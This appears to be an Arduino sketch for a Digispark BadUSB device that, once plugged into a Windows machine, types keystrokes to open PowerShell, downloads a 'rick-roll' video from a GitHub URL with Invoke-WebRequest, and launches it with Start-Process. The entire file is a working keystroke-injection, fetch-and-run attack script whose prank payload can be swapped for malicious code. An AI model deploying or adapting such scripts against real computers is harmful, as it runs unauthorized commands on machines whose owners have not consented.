#include "DigiKeyboard.h"

void setup() {
  // empty
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900);
  
  // Download the file using Invoke-WebRequest
  DigiKeyboard.print("$url = \"https://github.com/piyush-panpaliya/rick-roll/raw/main/rr.mp4\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$output = \"$env:USERPROFILE\\rr.mp4\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Invoke-WebRequest -Uri $url -OutFile $output");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Play the downloaded file
  DigiKeyboard.print("Start-Process $output");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

//tart-Process $output

  for(;;){ /*empty*/ }
}
